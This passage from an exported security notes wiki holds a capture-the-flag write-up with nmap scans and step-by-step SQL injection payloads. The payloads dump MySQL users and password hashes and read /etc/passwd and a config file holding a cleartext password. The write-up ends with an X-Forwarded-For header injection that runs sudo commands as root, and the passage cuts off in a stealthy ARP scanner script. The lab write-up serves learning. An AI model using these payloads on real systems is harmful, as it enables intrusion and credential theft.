style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --reason&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.129.202.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Output:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &#039;up&#039; and scan times may be slower.\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 19:24 MDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 19:24\nCompleted NSE at 19:24, 0.00s elapsed\nInitiating NSE at 19:24\nCompleted NSE at 19:24, 0.00s elapsed\nInitiating NSE at 19:24\nCompleted NSE at 19:24, 0.00s elapsed\nInitiating Parallel DNS resolution of 1 host. at 19:24\nCompleted Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed\nInitiating SYN Stealth Scan at 19:24\nScanning 10.129.202.139 [65535 ports]\nDiscovered open port 80/tcp on 10.129.202.139\nSYN Stealth Scan Timing: About 21.06% done; ETC: 19:26 (0:01:56 remaining)\nSYN Stealth Scan Timing: About 55.83% done; ETC: 19:26 (0:00:48 remaining)\nCompleted SYN Stealth Scan at 19:25, 91.51s elapsed (65535 total ports)\nInitiating Service scan at 19:25\nScanning 1 service on 10.129.202.139\nCompleted Service scan at 19:26, 6.12s elapsed (1 service on 1 host)\nInitiating OS detection (try #1) against 10.129.202.139\nRetrying OS detection (try #2) against 10.129.202.139\nInitiating Traceroute at 19:26\nCompleted Traceroute at 19:26, 0.07s elapsed\nInitiating Parallel DNS resolution of 2 hosts. at 19:26\nCompleted Parallel DNS resolution of 2 hosts. at 19:26, 0.02s elapsed\nNSE: Script scanning 10.129.202.139.\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 5.07s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.22s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nNmap scan report for 10.129.202.139\nHost is up, received user-set (0.058s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE REASON         VERSION\n80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n|http-server-header: nginx/1.18.0 (Ubuntu)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|      httponly flag not set\n| http-methods:\n|_  Supported Methods: GET HEAD POST\n|_http-title: Site doesn&#039;t have a title (text/html; charset=UTF-8).\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (94%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)\nNo exact OS matches for host (test conditions non-ideal).\nUptime guess: 27.153 days (since Fri Mar 31 15:46:21 2023)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   63.08 ms 10.10.14.1\n2   63.24 ms 10.129.202.139\n\nNSE: Script Post-scanning.\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nInitiating NSE at 19:26\nCompleted NSE at 19:26, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 107.94 seconds\n           Raw packets sent: 131215 (5.777MB) | Rcvd: 251 (19.772KB)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Well, that’s less than helpful; we already knew that there was a web server running on port 80 (and there’s nothing else).&lt;/p&gt;\n&lt;p&gt;Okay, let’s try fuzzing the two pages with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; and see what we get! Interesting observations…&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;/index.php\n&lt;ol&gt;\n&lt;li&gt;Submitting hexadecimal numbers for &lt;code&gt;player&lt;/code&gt; (for example, 0x0 or 0xabad1dea) result in only the &lt;em&gt;first&lt;/em&gt; half of the normal response, without any HTML or the /challenge.php link.&lt;/li&gt;\n&lt;li&gt;You can insert any HTML you’d like, and it gets rendered back in the page.&lt;/li&gt;\n&lt;li&gt;Inputs always seem to be lower-cased before they’re returned.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; OR 1=1 -- 1&lt;/code&gt; and &lt;code&gt;&#039; OR &#039;1&#039;=&#039;1&lt;/code&gt; are &lt;em&gt;also&lt;/em&gt; missing the second half of the response, like the 0x numbers. So maybe we have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SQL-injection-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SQL-injection-attacks&quot;&gt;SQL injection&lt;/a&gt;?&lt;/li&gt;\n&lt;/ol&gt;\n&lt;/li&gt;\n&lt;li&gt;/challenge.php returns nothing interesting…&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;(I really need a more targeted fuzzing list than the “big list of naughty strings”, as the free version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; throttles Intruder so much that this list takes over 30 minutes to process!)&lt;/p&gt;\n&lt;p&gt;(Also, be sure to look at the response in &lt;strong&gt;Raw&lt;/strong&gt; mode to avoid going down bunny trails about formatting changes that ​&lt;em&gt;don’t actually exist in the server response&lt;/em&gt;​!)&lt;/p&gt;\n&lt;p&gt;Okay, so not many clues at this point. SQL injection &lt;em&gt;might&lt;/em&gt; be a thing, but the behavior with hexadecimal numbers is… Odd.&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;So, here I’m going to “cheat” a bit. I know from the discussion on Discord that SQL injection &lt;em&gt;is&lt;/em&gt; a thing for this box, and is, in fact, how you get the first flag. So even though my evidence at this point is circumstantial/weak, I’m going to go that route.&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Since &lt;code&gt;&#039; OR 1=1 -- 1&lt;/code&gt; gave us something interesting, let’s send /index.php to Repeater and see what some other values for &lt;code&gt;player&lt;/code&gt; do for us…&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT &#039;&gt;&gt;&gt;STUFF&amp;#x3C;&amp;#x3C;&amp;#x3C;&#039; -- 1&lt;/code&gt; returns &lt;code&gt;&gt;&gt;&gt;STUFF&amp;#x3C;&amp;#x3C;&amp;#x3C;&lt;/code&gt; for the user name!&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT @@datadir -- 1&lt;/code&gt; returns &lt;code&gt;/var/lib/mysql&lt;/code&gt;, so we’re dealing with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT schema_name FROM information_schema.schemata -- 1&lt;/code&gt; returns &lt;code&gt;mysql&lt;/code&gt; … Which isn’t right. It looks like only a single row (probably the last one, given that we only see one row with &lt;code&gt;UNION&lt;/code&gt; ) is returned.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; also returns &lt;code&gt;mysql&lt;/code&gt; … But using &lt;code&gt;OFFSET 1&lt;/code&gt; returns &lt;code&gt;information_schema&lt;/code&gt; , so I guess we’ll just do it this way. Iterating, we also see databases called &lt;code&gt;performance_schema&lt;/code&gt; , &lt;code&gt;sys&lt;/code&gt; , and &lt;code&gt;november&lt;/code&gt; . All of these are standard &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt; databases except for &lt;code&gt;november&lt;/code&gt; .&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT database() -- 1&lt;/code&gt; confirms that we’re in the &lt;code&gt;november&lt;/code&gt; database.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT table_name FROM information_schema.tables WHERE table_schema != &#039;november&#039; LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; returns &lt;code&gt;flag&lt;/code&gt; , and iterating reveals a second table &lt;code&gt;players&lt;/code&gt; . There doesn’t seem to be anything else. The &lt;code&gt;flag&lt;/code&gt; table looks promising, so let’s see what’s there.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT column_name FROM information_schema.columns WHERE table_schema = &#039;november&#039; and table_name = &#039;flag&#039; LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) reveals that there’s a single column called &lt;code&gt;one&lt;/code&gt; .&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT COUNT(*) FROM flag -- 1&lt;/code&gt; reveals that there’s only a single row in &lt;code&gt;flag&lt;/code&gt; . Easy!&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT one FROM flag -- 1&lt;/code&gt; then provides a “flag” value.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;(The above is made possible using &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this handy SQL injection cheat-sheet for MySQL&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.)&lt;/p&gt;\n&lt;p&gt;Now, as it turns out, this is &lt;em&gt;not&lt;/em&gt; a flag for the box! Instead, inputting it into /challenge.php generates the message that &lt;code&gt;Your IP Address has now been granted SSH Access&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Let’s confirm…&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; union2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --reason&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.129.202.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Output:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &#039;up&#039; and scan times may be slower.\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:16 MDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 21:16\nCompleted NSE at 21:16, 0.00s elapsed\nInitiating NSE at 21:16\nCompleted NSE at 21:16, 0.00s elapsed\nInitiating NSE at 21:16\nCompleted NSE at 21:16, 0.00s elapsed\nInitiating Parallel DNS resolution of 1 host. at 21:16\nCompleted Parallel DNS resolution of 1 host. at 21:16, 0.01s elapsed\nInitiating SYN Stealth Scan at 21:16\nScanning 10.129.202.139 [65535 ports]\nDiscovered open port 22/tcp on 10.129.202.139\nDiscovered open port 80/tcp on 10.129.202.139\nCompleted SYN Stealth Scan at 21:17, 35.32s elapsed (65535 total ports)\nInitiating Service scan at 21:17\nScanning 2 services on 10.129.202.139\nCompleted Service scan at 21:17, 6.12s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 10.129.202.139\nRetrying OS detection (try #2) against 10.129.202.139\nRetrying OS detection (try #3) against 10.129.202.139\nRetrying OS detection (try #4) against 10.129.202.139\nRetrying OS detection (try #5) against 10.129.202.139\nInitiating Traceroute at 21:17\nCompleted Traceroute at 21:17, 0.06s elapsed\nInitiating Parallel DNS resolution of 2 hosts. at 21:17\nCompleted Parallel DNS resolution of 2 hosts. at 21:17, 0.01s elapsed\nNSE: Script scanning 10.129.202.139.\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 1.73s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.27s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.02s elapsed\nNmap scan report for 10.129.202.139\nHost is up, received user-set (0.054s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)\n|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)\n|_  256 2221e9f485908745161f733641ee3b32 (ED25519)\n80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|http-title: Site doesn&#039;t have a title (text/html; charset=UTF-8).\n| http-methods:\n|  Supported Methods: GET HEAD POST\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=4/27%OT=22%CT=1%CU=31913%PV=Y%DS=2%DC=T%G=Y%TM=644B3AD\nOS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS\nOS:=A)OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M\nOS:550ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE\nOS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\nOS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\nOS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\nOS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\nOS:=40%CD=S)\n\nUptime guess: 27.230 days (since Fri Mar 31 15:46:20 2023)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=256 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 111/tcp)\nHOP RTT      ADDRESS\n1   56.02 ms 10.10.14.1\n2   56.12 ms 10.129.202.139\n\nNSE: Script Post-scanning.\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.00s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.00s elapsed\nInitiating NSE at 21:17\nCompleted NSE at 21:17, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 56.07 seconds\n           Raw packets sent: 66144 (2.914MB) | Rcvd: 65710 (2.632MB)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;So, we definitely have an open &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; port now! But what user to use?&lt;/p&gt;\n&lt;p&gt;Maybe there’s password re-use with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt;? Let’s see what we’ve got:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT COUNT(*) FROM mysql.user -- 1&lt;/code&gt; shows that we have 6 users.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT user FROM mysql.user LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) shows that these users are &lt;code&gt;debian-sys-maint&lt;/code&gt;, &lt;code&gt;mysql.infoschema&lt;/code&gt;, &lt;code&gt;mysql.session&lt;/code&gt;, &lt;code&gt;mysql.sys&lt;/code&gt;, &lt;code&gt;root&lt;/code&gt;, and &lt;code&gt;uhc&lt;/code&gt;. Both &lt;code&gt;root&lt;/code&gt; and &lt;code&gt;uhc&lt;/code&gt; look promising.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT host FROM mysql.user WHERE user = &#039;root&#039; -- 1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) shows that both are permitted to login from &lt;code&gt;localhost&lt;/code&gt; (though that may not mean anything, since this is just database access).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT authentication_string FROM mysql.user WHERE user = &#039;root&#039; -- 1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) reveals that &lt;code&gt;root&lt;/code&gt; &lt;em&gt;doesn’t&lt;/em&gt; have a password, but &lt;code&gt;uhc&lt;/code&gt; does have a password hash. (Apparently there’s no &lt;code&gt;password&lt;/code&gt; column in the &lt;code&gt;mysql.users&lt;/code&gt; table anymore; it’s now called &lt;code&gt;authentication_string&lt;/code&gt; per &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the documentation&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.)&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;Unfortunately, it turns out that we can’t just feed this hash into &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/John-the-Ripper&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/John-the-Ripper&quot;&gt;john&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt;, but need to &lt;a href=&quot;https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;massage things a bit first&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;First, we use ​&lt;code&gt;&#039; UNION SELECT CONCAT(&#039;$mysql&#039;,LEFT(authentication_string,6),&#039;*&#039;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#039;*&#039;)) FROM mysql.user WHERE user = &#039;uhc&#039;&lt;/code&gt;​ to get a string that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; can handle.&lt;/li&gt;\n&lt;li&gt;Then we run &lt;code&gt;hashcat -m 7401 -O hash.txt rockyou.txt&lt;/code&gt;.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;But, this is going to take a loooong time… So, I tried a few other things:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;There’s 6 users in the &lt;code&gt;players&lt;/code&gt; table, but none of them work as passwords (or alternate user names).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT LOAD_FILE(&#039;/etc/passwd&#039;) -- 1&lt;/code&gt; displays the password file, but I can’t access /etc/shadow, so it doesn’t look like we’re running as root.&lt;/li&gt;\n&lt;li&gt;But we can look at other files, including /config.php! And it turns out that there’s a cleartext password there that we can read with &lt;code&gt;&#039; UNION SELECT LOAD_FILE(&#039;/var/www/html/config.php&#039;) -- 1&lt;/code&gt; : &lt;code&gt;uhc-11qual-global-pw&lt;/code&gt;. ​&lt;em&gt;This works to log in as the &lt;code&gt;uhc&lt;/code&gt; user!&lt;/em&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The &lt;strong&gt;first flag&lt;/strong&gt; is then in the user.txt file in /home/uhc.&lt;/p&gt;\n&lt;p&gt;Unfortunately, uhc isn’t in the sudoers file, and there’s no obviously vulnerably SUID binaries or files with loose permissions.&lt;/p&gt;\n&lt;p&gt;But…&lt;/p&gt;\n&lt;p&gt;If you run &lt;code&gt;&#039; UNION SELECT LOAD_FILE(&#039;/var/www/html/firewall.php&#039;) -- 1&lt;/code&gt; , you’ll see that the &lt;em&gt;web server&lt;/em&gt; has &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; access, and uses it to make a call to iptables using the value of either the X-Forwarded-For or Remote-Host headers. And since this call is just a concatenation of the value of this header wrapped in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt;’s &lt;code&gt;system()&lt;/code&gt; call, that means &lt;em&gt;I&lt;/em&gt; can insert whatever I want. For example, setting&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;X-Forwarded-For:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 127.0.0.1 -j ACCEPT; sudo ls -la /root ; echo&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;lists the contents of the /root directory, revealing the standard /root/root.txt flag file. And thus&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;X-Forwarded-For:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 127.0.0.1 -j ACCEPT; sudo cat /root/root.txt ; echo&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;will return the contents of that file.&lt;/p&gt;\n&lt;p&gt;Which just so happens to be the ​&lt;strong&gt;second flag&lt;/strong&gt;​.&lt;/p&gt;\n&lt;p&gt;(Really, I &lt;em&gt;should&lt;/em&gt; have used this trick to get both flags…)&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 4 h 6 min&lt;/p&gt;","rssInclude":true},"spells/ARP-scanning":{"slug":"spells/ARP-scanning","filePath":"spells/ARP scanning.md","title":"ARP scanning","links":["spells/ARP","spells/ICMP"],"tags":["Protocol/ARP","Language/Python/Scapy","Scripts","Protocol/ICMP"],"content":"Scanning a network with ARP rather than ICMP is one method of keeping a lower profile, as ARP requests are less likely to be monitored.\nIt’s fairly easy to set up such a scanner using the Scapy module:\n#!/usr/bin/env python3\n \n# Scans the given IP range on the given network using ARP\n# rather than ICMP to help bypass potential alerting.\n \nfrom scapy.all import *\n \ninterface = &quot;eth0&quot;\nip_range = &quot;10.10.X.X/24&quot;\nbroadcastMac = &quot;ff:ff:ff:ff:ff:ff&quot;\n \npacket = Ether(dst = broadcastMac) / ARP(pdst = ip_range)\n \nans, unans = srp(packet, timeout = 2, iface = interface, inter = 0.1)\n \nfor send, receive in ans:\n\tprint(receive.sprintf(r&quot;%Ether.src% - %ARP.psrc%&quot;))\nNote that the r here isn’t a mistake — rather it specifies a “raw string” (the use of which, incidentally, requires Python 3.6+).","richContent":"&lt;p&gt;Scanning a network with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ARP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ARP&quot;&gt;ARP&lt;/a&gt; rather than &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; is one method of keeping a lower profile, as &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ARP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ARP&quot;&gt;ARP&lt;/a&gt; requests are less likely to be monitored.&lt;/p&gt;\n&lt;p&gt;It’s fairly easy to set up such a scanner using the &lt;a href=&quot;https://scapy.net/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Scapy&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; module:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/usr/bin/env 